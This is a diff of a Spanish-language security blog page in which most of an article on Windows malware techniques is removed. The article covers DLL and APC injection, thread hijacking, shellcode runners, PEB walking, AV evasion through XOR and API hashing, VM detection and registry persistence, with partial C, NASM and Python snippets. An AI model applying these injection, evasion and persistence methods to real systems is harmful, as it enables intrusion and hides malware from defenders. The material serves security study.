-    <span class="syn-k">return</span> <span class="syn-n">0</span>;
-}</code></pre></div>
-<p>Para pivotar a otro proceso (p. ej. calc.exe) se usa <span class="mono">OpenProcess</span>, <span class="mono">VirtualAllocEx</span>, <span class="mono">WriteProcessMemory</span> y <span class="mono">CreateRemoteThread</span>; la memoria se asigna directamente en el espacio de direcciones del objetivo con permisos de ejecución.</p>
-
-<h2 id="a10"><span class="idx">11.</span> Classic DLL injection into the process</h2>
-<p>Consiste en cargar una DLL maliciosa en un proceso legítimo. Flujo: localizar la DLL, crear un hilo en el proceso destino, asignar memoria para la ruta de la DLL, cargarla con <span class="mono">LoadLibraryA</span> y ejecutar su punto de entrada (<span class="mono">DllMain</span>).</p>
-<div class="code-wrap"><span class="lang">c · dllmain.cpp</span><pre class="code"><code><span class="syn-c">// dllmain.cpp - DLL maliciosa de ejemplo</span>
-<span class="syn-k">#include</span> <span class="syn-s">"pch.h"</span>
-BOOL <span class="syn-k">APIENTRY</span> <span class="syn-f">DllMain</span>(HMODULE hModule,
-    DWORD nReason, LPVOID lpReserved) {
-    <span class="syn-k">switch</span> (nReason) {
-    <span class="syn-k">case</span> DLL_PROCESS_ATTACH:
-        <span class="syn-f">MessageBox</span>(NULL,
-            (LPCWSTR)<span class="syn-s">L"Meow from DLL!"</span>,
-            (LPCWSTR)<span class="syn-s">L"=^..^="</span>, MB_OK);
-        <span class="syn-k">break</span>;
-    }
-    <span class="syn-k">return</span> TRUE;
-}</code></pre></div>
-<div class="callout callout-warn"><span class="ico">⚠️</span><div>
-  <div class="h">DLL hijacking en Windows 10</div>
-  <p>En teoría, para hacer DLL hijacking solo hay que explotar la jerarquía de búsqueda de las DLL. Pero en Windows 10 moderno las pruebas no funcionan por protecciones como Known DLLs y las mitigaciones de búsqueda de DLL.</p>
-</div></div>
-
-<h2 id="a11"><span class="idx">12.</span> Find process ID by name and inject to it</h2>
-<p>Lógica para encontrar procesos por nombre e inyectarlos usando <span class="mono">CreateToolhelp32Snapshot</span> y <span class="mono">Process32First/Next</span>:</p>
-<div class="code-wrap"><span class="lang">c · win32</span><pre class="code"><code><span class="syn-k">int</span> <span class="syn-f">findMyProc</span>(<span class="syn-k">const char</span>* procname) {
-    HANDLE hSnapshot;
-    PROCESSENTRY32 pe;
-    <span class="syn-k">int</span> pid = <span class="syn-n">0</span>;
-    BOOL hResult;
-    hSnapshot = <span class="syn-f">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="syn-n">0</span>);
-    <span class="syn-k">if</span> (INVALID_HANDLE_VALUE == hSnapshot) <span class="syn-k">return</span> <span class="syn-n">0</span>;
-    pe.dwSize = <span class="syn-f">sizeof</span>(PROCESSENTRY32);
-    hResult = <span class="syn-f">Process32First</span>(hSnapshot, &amp;pe);
-    <span class="syn-k">while</span>(hResult) {
-        <span class="syn-k">if</span> (<span class="syn-f">strcmp</span>(procname,
-            (<span class="syn-k">const char</span>*)pe.szExeFile) == <span class="syn-n">0</span>) {
-            pid = pe.th32ProcessID;
-            <span class="syn-k">break</span>;
-        }
-        hResult = <span class="syn-f">Process32Next</span>(hSnapshot, &amp;pe);
-    }
-    <span class="syn-f">CloseHandle</span>(hSnapshot);
-    <span class="syn-k">return</span> pid;
-}</code></pre></div>
-
-<h2 id="a12"><span class="idx">13.</span> Windows shellcoding 1 — punteros a función</h2>
-<p>Patrón fundamental de ejecución de shellcode mediante punteros a función: exactamente el mecanismo del dropper original.</p>
-<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-k">char</span> code[] = <span class="syn-s">"my shellcode here"</span>;
-<span class="syn-k">int</span> <span class="syn-f">main</span>(<span class="syn-k">int</span> argc, <span class="syn-k">char</span> **argv) {
-    <span class="syn-k">int</span> (*func)();
-    func = (<span class="syn-k">int</span>(*)()) code;
-    (<span class="syn-k">int</span>)(*func)();
-    <span class="syn-k">return</span> <span class="syn-n">1</span>;
-}</code></pre></div>
-<p>Se incluye un script auxiliar en Python para revertir strings y convertirlos a hexadecimal en formato little-endian, necesario al construir la shellcode:</p>
-<div class="code-wrap"><span class="lang">python</span><pre class="code"><code><span class="syn-k">import</span> sys
-input = sys.argv[<span class="syn-n">1</span>]
-chunks = [input[i:i+<span class="syn-n">4</span>] <span class="syn-k">for</span> i <span class="syn-k">in</span> <span class="syn-f">range</span>(<span class="syn-n">0</span>, <span class="syn-f">len</span>(input), <span class="syn-n">4</span>)]
-<span class="syn-k">for</span> chunk <span class="syn-k">in</span> chunks[::-<span class="syn-n">1</span>]:
-    <span class="syn-f">print</span>(chunk[::-<span class="syn-n">1</span>].encode(<span class="syn-s">"utf-8"</span>).hex())</code></pre></div>
-
-<h2 id="a13"><span class="idx">14.</span> Windows shellcoding 2 — PEB y TEB</h2>
-<p>Cada vez que se ejecuta un <span class="mono">.exe</span> se crean las estructuras <b>PEB</b> (Process Environment Block) y <b>TEB</b> (Thread Environment Block). El PEB contiene la información necesaria para el proceso; cada hilo tiene su propio TEB. Escribiendo en ASM se recorre la estructura PEB → LDR para encontrar la dirección de <span class="mono">kernel32.dll</span> sin usar <span class="mono">GetModuleHandle</span>:</p>
-<div class="code-wrap"><span class="lang">nasm · x86</span><pre class="code"><code><span class="syn-c">; Encontrar kernel32.dll via PEB</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">fs</span>:<span class="syn-v">ecx</span> + <span class="syn-n">0x30</span>]  <span class="syn-c">; Desplazamiento a PEB</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">eax</span> + <span class="syn-n">0xc</span>]   <span class="syn-c">; Desplazamiento a LDR</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">eax</span> + <span class="syn-n">0x14</span>]  <span class="syn-c">; InMemoryOrderModuleList</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">eax</span>]         <span class="syn-c">; 1er módulo (nuestro .exe)</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">eax</span>]         <span class="syn-c">; 2do módulo (ntdll.dll)</span>
-<span class="syn-k">mov</span> <span class="syn-v">eax</span>, [<span class="syn-v">eax</span> + <span class="syn-n">0x10</span>]  <span class="syn-c">; 3er módulo (kernel32.dll)</span></code></pre></div>
-
-<h2 id="a14"><span class="idx">15.</span> Windows shellcoding 3 — PE file structure</h2>
-<p>Un archivo PE es el formato nativo de Win32 (análogo a los COFF de Unix). Su estructura incluye:</p>
-<ul>
-  <li><b>DOS Header:</b> información necesaria para cargar el archivo PE.</li>
-  <li><b>DOS Stub:</b> zona mayormente de ceros tras los primeros 64 bytes.</li>
-  <li><b>PE Header (NT Header):</b> contiene la firma "PE\0\0" (bytes <span class="mono">50 45 00 00</span>).</li>
-  <li><b>File Header (COFF Header):</b> características básicas del archivo.</li>
-  <li><b>Optional Header:</b> contiene <span class="mono">AddressOfEntryPoint</span>, <span class="mono">ImageBase</span>, <span class="mono">SectionAlignment</span>, <span class="mono">SizeOfImage</span> y los directorios de datos (exportación, importación, recursos, excepciones, certificados, reubicación, TLS, IAT, CLR runtime header, etc.).</li>
-  <li><b>Section Table:</b> arreglo de <span class="mono">IMAGE_SECTION_HEADER</span> que define secciones como <span class="mono">.text</span>.</li>
-</ul>
-
-<h2 id="a15"><span class="idx">16.</span> APC injection technique (Early Bird)</h2>
-<p>La técnica <b>Early Bird</b> aprovecha <span class="mono">QueueUserAPC</span> para encolar un APC (Asynchronous Procedure Call) en un hilo específico:</p>
-<ol>
-  <li>Crear un proceso legítimo con el flag <span class="mono">CREATE_SUSPENDED</span>.</li>
-  <li>Asignar memoria para la carga útil en el espacio del nuevo proceso.</li>
-  <li>Declarar la rutina APC que apunta a la shellcode.</li>
-  <li>Reanudar el hilo principal para que ejecute el APC antes de su ejecución normal.</li>
-</ol>
-<h3>APC injection via NtTestAlert</h3>
-<p><span class="mono">NtTestAlert</span> es una syscall no documentada que comprueba si hay APC pendientes en el hilo actual y los ejecuta. Antes de que cualquier hilo comience a ejecutarse, su dirección de inicio Win32 llama a <span class="mono">NtTestAlert</span> para ejecutar APC pendientes — sin necesidad de un hilo remoto en otro proceso.</p>
-<h3>APC injection via alertable threads</h3>
-<p>Variante que localiza los subprocesos del proceso destino y encola un APC a todos, maximizando la probabilidad de ejecución.</p>
-
-<h2 id="a16"><span class="idx">17.</span> Code injection via thread hijacking</h2>
-<p>El secuestro de un proceso se logra suspendiéndolo y vaciando su memoria, que luego se reemplaza con código malicioso:</p>
-<ol>
-  <li>Crear un identificador del proceso víctima.</li>
-  <li>Suspender el proceso con <span class="mono">SuspendThread</span>.</li>
-  <li>Obtener el contexto del hilo con <span class="mono">GetThreadContext</span> (incluye el registro RIP).</li>
-  <li>Modificar <span class="mono">ct.Rip = (DWORD_PTR)rb</span> para que apunte a la shellcode.</li>
-  <li>Establecer el contexto modificado con <span class="mono">SetThreadContext</span>.</li>
-  <li>Reanudar el hilo con <span class="mono">ResumeThread</span>.</li>
-</ol>
-
-<h2 id="a17"><span class="idx">18.</span> Classic DLL injection via SetWindowsHookEx</h2>
-<p><span class="mono">SetWindowsHookEx</span> permite instalar hooks de sistema global. Al configurar un hook de teclado (<span class="mono">WH_KEYBOARD</span>) con una callback que reside en nuestra DLL, el sistema carga la DLL en el espacio de direcciones de los procesos que reciben mensajes de teclado. Los sistemas modernos bloquean la técnica con <b>CFG</b> (Control Flow Guard) y <b>CIG</b> (Code Integrity Guard).</p>
-<div class="code-wrap"><span class="lang">c · win32</span><pre class="code"><code><span class="syn-c">// DLL exportada</span>
-<span class="syn-k">extern</span> <span class="syn-s">"C"</span> <span class="syn-k">__declspec</span>(<span class="syn-k">dllexport</span>) <span class="syn-k">int</span> <span class="syn-f">Meow</span>() {
-    <span class="syn-f">MessageBox</span>(NULL,
-        (LPCWSTR)<span class="syn-s">L"Meow meow"</span>,
-        (LPCWSTR)<span class="syn-s">L"=^..^="</span>, MB_OK);
-    <span class="syn-k">return</span> <span class="syn-n">0</span>;
-}
-
-<span class="syn-c">// Configuración del hook global</span>
-HHOOK hook = <span class="syn-f">SetWindowsHookEx</span>(WH_KEYBOARD,
-    (HOOKPROC)meowFunc, meowDll, <span class="syn-n">0</span>);</code></pre></div>
-
-<h2 id="a18"><span class="idx">19.</span> Code injection via Windows fibers</h2>
-<p>Fibers es una API para hilos de ejecución ligeros: más eficientes que los hilos del sistema pero menos seguros (no están protegidos con sus características). Flujo:</p>
-<ol>
-  <li>Convertir el hilo actual en un Fiber con <span class="mono">ConvertThreadToFiber(NULL)</span>.</li>
-  <li>Asignar memoria para el código malicioso con <span class="mono">VirtualAlloc</span>.</li>
-  <li>Crear una nueva Fiber con <span class="mono">CreateFiber</span> apuntando al código.</li>
-  <li>Cambiar el contexto con <span class="mono">SwitchToFiber</span>.</li>
-</ol>
-
-<h2 id="a19"><span class="idx">20.</span> Windows API hooking</h2>
-<p>El API hooking intercepta y modifica el comportamiento de las llamadas a la API. Consiste en reemplazar los primeros 5 bytes de la función original con un <span class="mono">JMP</span> relativo (<span class="mono">\xE9</span>) que redirige a una función personalizada. Hay que almacenar los bytes originales para poder restaurar la función cuando sea necesario. Un segundo método usa <span class="mono">push</span> + <span class="mono">ret</span> (<span class="mono">\x68</span> + dirección + <span class="mono">\xC3</span>) en lugar del salto relativo.</p>
-
-<h2 id="a20"><span class="idx">21.</span> DLL injection via undocumented NtCreateThreadEx</h2>
-<p>Utiliza la función no documentada <span class="mono">NtCreateThreadEx</span> de ntdll.dll, que permite indicar el tamaño de la pila y otras flags de creación, dando más flexibilidad que <span class="mono">CreateRemoteThread</span>. Al no estar documentada ni exportarse de la biblioteca de importación de kernel32.dll, es más sigilosa que las técnicas tradicionales.</p>
-
-<h2 id="a21"><span class="idx">22.</span> Code injection via memory sections (NtCreateSection)</h2>
-<p>Una sección es un bloque de memoria compartido entre procesos, creado con <span class="mono">NtCreateSection</span>:</p>
-<ol>
-  <li>Crear una sección de memoria compartida con <span class="mono">NtCreateSection</span>.</li>
-  <li>Mapear la sección localmente con <span class="mono">NtMapViewOfSection</span>.</li>
-  <li>Mapear la misma sección en el proceso objetivo (solo lectura).</li>
-  <li>Copiar el payload en la sección local (se refleja en la remota).</li>
-  <li>Crear un hilo remoto con <span class="mono">RtlCreateUserThread</span>.</li>
-  <li>Desmapear con <span class="mono">ZwUnmapViewOfSection</span>.</li>
-</ol>
-
-<h2 id="a22"><span class="idx">23.</span> Code injection via ZwQueueApcThread</h2>
-<p>Similar a la APC estándar pero usando <span class="mono">ZwQueueApcThread</span> en lugar de <span class="mono">QueueUserAPC</span>. Combina la creación de secciones de memoria compartida con <span class="mono">ZwCreateSection</span> y el encolado de APC con la función nativa de ntdll.dll. Se usa <span class="mono">ZwSetInformationThread</span> con <span class="mono">THREADINFOCLASS 1</span> para forzar que el hilo se vuelva alertable.</p>
-
-<h2 id="a23"><span class="idx">24.</span> Process injection via KernelCallbackTable</h2>
-<p><span class="mono">KernelCallbackTable</span> es una tabla de punteros a funciones para registrar controladores de eventos del kernel. Al inyectar código en esta tabla, un atacante reemplaza un controlador existente por uno propio: cuando se produce el evento se llama al controlador malicioso, ejecutando código arbitrario en el contexto del proceso objetivo.</p>
-
-<h2 id="a24"><span class="idx">25.</span> Process injection via RWX memory hunting</h2>
-<p>Busca regiones de memoria con permisos <b>RWX (Read-Write-Execute)</b> en el proceso objetivo usando <span class="mono">VirtualQueryEx</span>. Una vez encontrada, escribe la shellcode directamente y crea un hilo remoto. Evita la llamada a <span class="mono">VirtualAllocEx</span>, reduciendo la huella de llamadas sospechosas.</p>
-
-<h2 id="a25"><span class="idx">26.</span> Process injection via FindWindow</h2>
-<p>Usa <span class="mono">FindWindow</span> para localizar el HWND del proceso objetivo; luego <span class="mono">GetWindowThreadProcessId</span> obtiene el PID y se procede con la inyección estándar.</p>
-<h3>VM evasion via FindWindow</h3>
-<p>Variante de evasión que busca ventanas específicas de VirtualBox (<span class="mono">VBoxTrayToolWndClass</span>, <span class="mono">VBoxTrayToolWnd</span>) para detectar si se está en un entorno virtualizado y condicionar la ejecución del payload.</p>
-
-<h2 id="a26"><span class="idx">27.</span> Download and inject logic</h2>
-<p>Técnica para descargar una carga útil o DLL maliciosa desde una URL usando HTTP (WinInet). Puede funcionar detrás de redes que solo permiten tráfico HTTP e incluso a través de un proxy preconfigurado. El flujo: abrir sesión HTTP con <span class="mono">InternetOpen</span>, descargar con <span class="mono">InternetOpenUrl</span> e <span class="mono">InternetReadFile</span>, guardar con <span class="mono">CreateFile/WriteFile</span> e inyectar usando la técnica clásica de DLL injection.</p>
-
-<h2 id="a27"><span class="idx">28.</span> Run shellcode via EnumDesktopsA / EnumChildWindows</h2>
-<p>Técnicas que aprovechan funciones de enumeración que aceptan un callback como parámetro. Al pasar la dirección de la shellcode como callback, el sistema la ejecuta en el contexto del proceso actual:</p>
-<ul>
-  <li><b>EnumDesktopsA:</b> enumera escritorios; el callback se pasa como <span class="mono">DESKTOPENUMPROC</span>.</li>
-  <li><b>EnumChildWindows:</b> enumera ventanas secundarias; el callback se pasa como <span class="mono">WNDENUMPROC</span>.</li>
-</ul>
-
-<h2 id="a28"><span class="idx">29.</span> AV engines evasion: XOR encryption</h2>
-<p>El cifrado XOR aplica la operación byte a byte entre la shellcode y una clave secreta:</p>
-<ol>
-  <li><b>Cifrado:</b> se toma la shellcode, se elige una clave aleatoria y se aplica XOR bit a bit a cada byte.</li>
-  <li><b>Descifrado en tiempo de ejecución:</b> la misma clave XOR se aplica al arreglo cifrado antes de copiarlo a memoria ejecutable.</li>
-</ol>
-<div class="code-wrap"><span class="lang">c</span><pre class="code"><code><span class="syn-k">void</span> <span class="syn-f">XOR</span>(<span class="syn-k">char</span>* data, <span class="syn-k">size_t</span> data_len,
-    <span class="syn-k">char</span>* key, <span class="syn-k">size_t</span> key_len) {
-    <span class="syn-k">int</span> j = <span class="syn-n">0</span>;
-    <span class="syn-k">for</span> (<span class="syn-k">int</span> i = <span class="syn-n">0</span>; i &lt; data_len; i++) {
-        <span class="syn-k">if</span> (j == key_len - <span class="syn-n">1</span>) j = <span class="syn-n">0</span>;
-        data[i] = data[i] ^ key[j];
-        j++;
-    }
-}</code></pre></div>
-<p>Se incluye un script Python que automatiza el flujo: cifrar la shellcode, reemplazar el placeholder en la plantilla C++ y compilar con MinGW.</p>
-
-<h2 id="a29"><span class="idx">30.</span> Hiding function calls with XOR encryption</h2>
-<p>Aplica XOR al nombre de funciones API como <span class="mono">VirtualAlloc</span> para que no aparezcan como strings legibles en el binario. En tiempo de ejecución se descifra el nombre, se obtiene la dirección con <span class="mono">GetProcAddress</span> y se asigna a un puntero de función para su uso.</p>
-
-<h2 id="a30"><span class="idx">31.</span> API hashing for AV evasion</h2>
-<p>El hashing convierte el nombre de la función en un hash único y usa ese hash en lugar del nombre real:</p>
-<ol>
-  <li>Cargar la DLL con <span class="mono">LoadLibrary</span>.</li>
-  <li>Recorrer la tabla de exportación de la DLL.</li>
-  <li>Calcular el hash de cada nombre de función exportada.</li>
-  <li>Comparar con el hash pre-calculado de la función deseada.</li>
-  <li>Si coincide, obtener la dirección y usarla.</li>
-</ol>
-<p>Evita que strings como "VirtualAlloc" o "CreateThread" aparezcan en el binario, eludiendo firmas estáticas.</p>
-
-<h2 id="a31"><span class="idx">32.</span> Persistence techniques</h2>
-<h3>Registry run keys</h3>
-<p>Modificar las claves de ejecución del registro para que el código se ejecute al iniciar el sistema o al iniciar sesión: <span class="mono">HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span>.</p>
-<h3>Screensaver hijack</h3>
-<p>Reemplazar el salvapantallas legítimo modificando las claves <span class="mono">ScreenSaveActive</span>, <span class="mono">ScreenSaveTimeout</span> y <span class="mono">SCRNSAVE.EXE</span> bajo <span class="mono">HKEY_CURRENT_USER\Control Panel\Desktop</span>.</p>
-<h3>COM DLL hijack</h3>
-<p>Sustituir una DLL legítima de un objeto COM por una maliciosa en <span class="mono">Software\Classes\CLSID\{...}\InprocServer32</span>.</p>
-<h3>Windows services</h3>
-<p>Los servicios corren en segundo plano sin interfaz gráfica. La persistencia se logra creando un servicio con inicio automático o modificando uno existente para que apunte a un binario malicioso.</p>
-<h3>AppInit_DLLs</h3>
-<p>La clave <span class="mono">AppInit_DLLs</span> especifica DLLs que se cargan automáticamente en el espacio de casi todas las aplicaciones cuando inician. Requiere altos privilegios.</p>
-<h3>Netsh helper DLL</h3>
-<p>Netsh puede cargar DLLs auxiliares. Al registrar una DLL maliciosa como helper (con la exportación <span class="mono">InitHelperDll</span>) se cargará cada vez que se ejecute la herramienta.</p>
-<h3>Winlogon</h3>
-<p>Modificar <span class="mono">HKEY_LOCAL_MACHINE\...\Windows NT\CurrentVersion\Winlogon\Shell</span> y <span class="mono">...\Winlogon\Userinit</span> para ejecutar código al iniciar sesión.</p>
-<h3>Port monitors</h3>
-<p>Los monitores de puerto del servicio de cola de impresión (spoolsv.exe) pueden reemplazarse por una DLL maliciosa cargada en el contexto del servicio, vía <span class="mono">\System\CurrentControlSet\Control\Print\Monitors\[nombre]</span>.</p>
 </article>
 <section class="related"><h2>Sigue leyendo</h2><div class="grid grid-2"><a class="card" href="exploit-development-lab.html"><span class="arrow">→</span><div class="meta"><span>2026-06-04</span><span>90 min</span></div><div class="t">Laboratorio de exploit development: kernel de Windows y ROP</div><div class="d">Bitácora de un mes de laboratorio: Windows internals, drivers KMDF/UMDF, formatos PE/ELF/DEX, Assembly x86/AMD64/ARM64, </div><span class="badge badge-infra">Exploit Development</span></a><a class="card" href="evasion-estatica-asm-mirai.html"><span class="arrow">→</span><div class="meta"><span>2026-06-01</span><span>25 min</span></div><div class="t">Evasión estática en ASM: romper firmas de Mirai sin packers</div><div class="d">De 16/64 a 0/65 en VirusTotal sin packers ni crypters: polimorfismo manual en Assembly x86, stub descifrador en NASM con</div><span class="badge badge-ti">Malware Analysis</span></a><a class="card" href="analystty.html"><span class="arrow">→</span><div class="meta"><span>2026-05-15</span><span>12 min</span></div><div class="t">analystty: triage automatizado de malware PE con Python</div><div class="d">Herramienta que extrae imports, detecta TTPs con MITRE ATT&amp;CK, desensambla la sección .text y genera breakpoints para x6</div><span class="badge badge-ti">Herramientas propias</span></a></div></section>
 </main>
 <footer class="site-footer"><div class="footer-inner">
 <div class="social"><a href="https://github.com/tty503" target="_blank" rel="noopener noreferrer">GitHub</a><a href="https://linkedin.com/in/tty503" target="_blank" rel="noopener noreferrer">LinkedIn</a><a href="https://x.com/tty_503" target="_blank" rel="noopener noreferrer">X / Twitter</a><a href="https://tty503.com/sitemap.xml" target="_blank" rel="noopener noreferrer">RSS</a></div>
-<p class="footer-note">© <span data-year></span> Christian Márquez · Threat Intelligence · Ingeniería Inversa · Exploit Development · Seguridad OT. Venezuela.</p>
+<p class="footer-note">© <span data-year></span> Christian Márquez (tty503) — security research. Reversing · Exploit Development · Vulnerability Research · Malware. Venezuela.</p>
 </div></footer>
 <button class="to-top" aria-label="Volver arriba">↑</button>
 <script src="assets/js/main.js"></script>
